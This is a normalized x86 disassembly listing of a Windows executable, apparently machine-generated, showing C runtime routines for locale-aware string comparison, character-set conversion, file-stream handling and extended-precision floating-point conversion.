cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_424864
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
add al 0x40
mov [ ebp + 0x8 ] al
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x5c
mov [ ebp + 0xb ] 0x0
call [ GetDriveTypeA@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
cmp eax 0x1
jne r-xdata
sub_4248b3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_41b3c1
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_41360f
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_41e7c0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_421df6
pop ecx
test eax eax
jne r-xdata
call sub_41360f
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_41e7c0
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_420bd9
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_4203d1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_424a27
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
inc eax
sub_424a47
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
test esi esi
jle r-xdata
test edx edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push esi
call sub_424a27
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x1c ]
push edx
call sub_424a27
pop ecx
mov edx eax
sub esi edx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
test esi esi
setge al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push edx
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ CompareStringW@IAT ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
sub_424ac3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_42489d
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
sub_424b0c
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_412f80
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_416223
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_412584
pop ecx
cmp eax edi
je r-xdata
call sub_420320
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_412e40
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_4121b5
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_424cc0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42396e
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42396e
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_426ce0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_424dd1
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_424dfe
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_425342
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
